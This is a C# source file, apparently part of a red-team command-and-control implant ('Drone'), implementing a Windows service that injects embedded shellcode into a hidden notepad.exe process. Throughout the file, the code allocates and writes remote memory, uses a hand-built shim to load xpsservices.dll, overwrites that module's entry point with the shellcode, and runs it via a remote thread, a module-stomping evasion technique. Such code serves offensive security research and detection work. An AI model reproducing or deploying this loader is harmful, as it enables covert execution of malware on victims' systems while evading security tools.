using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

using DInvoke.DynamicInvoke;

namespace Drone;

public partial class DroneService : ServiceBase
{
    public DroneService()
    {
        InitializeComponent();
    }

    protected override async void OnStart(string[] args)
    {
        // spawn process
        var process = SpawnProcess();
        
        // get address of LoadLibraryEx
        var llEx = Generic.GetLibraryAddress("kernel32.dll", "LoadLibraryExA");
        
        // generate shim
        var shim = GenerateShim((long)llEx);
        
        // allocate memory for shim
        var shimAddress = IntPtr.Zero;
        if (!Native.AllocateVirtualMemory(process.Handle, shim.Length, ref shimAddress) || shimAddress == IntPtr.Zero)
        {
            process.Kill();
            Environment.Exit(ExitCode);
        }
        
        // write shim
        if (!Native.WriteVirtualMemory(process.Handle, shimAddress, shim))
        {
            process.Kill();
            Environment.Exit(ExitCode);
        }

        // allocate memory for module name
        var moduleName = Encoding.ASCII.GetBytes(Module);
        var moduleNameAddress = IntPtr.Zero;
        if (!Native.AllocateVirtualMemory(process.Handle, moduleName.Length + 2, ref moduleNameAddress) || moduleNameAddress == IntPtr.Zero)
        {
            process.Kill();
            Environment.Exit(ExitCode);
        }
        
        // write module name
        if (!Native.WriteVirtualMemory(process.Handle, moduleNameAddress, moduleName))
        {
            process.Kill();
            Environment.Exit(ExitCode);
        }
        
        // change shim to RX
        if (!Native.ProtectVirtualMemory(process.Handle, shimAddress, shim.Length, (uint)Win32.MEMORY_PROTECTION.PAGE_EXECUTE_READ))
        {
            process.Kill();
            Environment.Exit(1);
        }
        
        // execute shim
        var hShimThread = IntPtr.Zero;
        if (!Native.CreateThreadEx(process.Handle, shimAddress, moduleNameAddress, ref hShimThread) || hShimThread == IntPtr.Zero)
        {
            process.Kill();
            Environment.Exit(ExitCode);
        }

        // wait on thread
        Win32.WaitForObject(hShimThread, Win32.INFINITE);
        
        // free shim/module memory
        Native.FreeVirtualMemory(process.Handle, shimAddress, shim.Length);
        Native.FreeVirtualMemory(process.Handle, moduleNameAddress, moduleName.Length + 2);
        
        // load module
        Win32.LoadLibraryEx(Module);
        
        // search for entrypoint
        var moduleEntry = GetModuleEntryPoint();

        if (moduleEntry == IntPtr.Zero)
        {
            process.Kill();
            Environment.Exit(ExitCode);
        }
        
        // get shellcode
        var shellcode = await GetEmbeddedResource("drone");
        
        // change module entry to RW
        if (!Native.ProtectVirtualMemory(process.Handle, moduleEntry, shellcode.Length, (uint)Win32.MEMORY_PROTECTION.PAGE_READWRITE))
        {
            process.Kill();
            Environment.Exit(1);
        }

        // write to module
        if (!Native.WriteVirtualMemory(process.Handle, moduleEntry, shellcode))
        {
            process.Kill();
            Environment.Exit(ExitCode);
        }
        
        // change module to RX
        if (!Native.ProtectVirtualMemory(process.Handle, moduleEntry, shellcode.Length, (uint)Win32.MEMORY_PROTECTION.PAGE_EXECUTE_READ))
        {
            process.Kill();
            Environment.Exit(1);
        }
        
        // execute shellcode
        var shellcodeThread = IntPtr.Zero;
        if (!Native.CreateThreadEx(process.Handle, moduleEntry, IntPtr.Zero, ref shellcodeThread) || shellcodeThread == IntPtr.Zero)
        {
            process.Kill();
        }
        
        Environment.Exit(ExitCode);
    }

    protected override void OnStop() { }
    
    private static async Task<byte[]> GetEmbeddedResource(string name)
    {
        var self = Assembly.GetExecutingAssembly();
        using var rs = self.GetManifestResourceStream(name);

        if (rs is null)
            return Array.Empty<byte>();

        using var ms = new MemoryStream();
        await rs.CopyToAsync(ms);

        return ms.ToArray();
    }

    private static Process SpawnProcess()
    {
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = SpawnTo,
                WindowStyle = ProcessWindowStyle.Hidden
            }
        };

        process.Start();
        return process;
    }

    private static byte[] GenerateShim(long loadLibraryExP)
    {
        using var ms = new MemoryStream();
        using var bw = new BinaryWriter(ms);

        if (Is64Bit)
        {
            bw.Write((ulong)loadLibraryExP);
            var loadLibraryExBytes = ms.ToArray();

            return new byte[]
            {
                0x48, 0xB8, loadLibraryExBytes[0], loadLibraryExBytes[1], loadLibraryExBytes[2], loadLibraryExBytes[3],
                loadLibraryExBytes[4], loadLibraryExBytes[5], loadLibraryExBytes[6], loadLibraryExBytes[7],
                0x49, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00,
                0x48, 0x31, 0xD2,
                0xFF, 0xE0
            };
        }
        else
        {
            bw.Write((uint)loadLibraryExP);
            var loadLibraryExBytes = ms.ToArray();

            return new byte[]
            {
                0xB8, loadLibraryExBytes[0], loadLibraryExBytes[1], loadLibraryExBytes[2], loadLibraryExBytes[3],
                0x6A, 0x01,
                0x6A, 0x00,
                0xFF, 0x74, 0x24, 0x0c,
                0xFF, 0xD0,
                0xC2, 0x0C, 0x00
            };
        }
    }

    private static IntPtr GetModuleEntryPoint()
    {
        var entryPoint = IntPtr.Zero;
        using var self = Process.GetCurrentProcess();
        
        foreach (ProcessModule module in self.Modules)
        {
            if (!module.ModuleName.Equals(Module, StringComparison.OrdinalIgnoreCase))
                continue;

            entryPoint = module.EntryPointAddress;
            break;
        }

        return entryPoint;
    }
    
    private static bool Is64Bit => IntPtr.Size == 8;

    private static string SpawnTo => @"notepad.exe";
    private static string Module => "xpsservices.dll";
}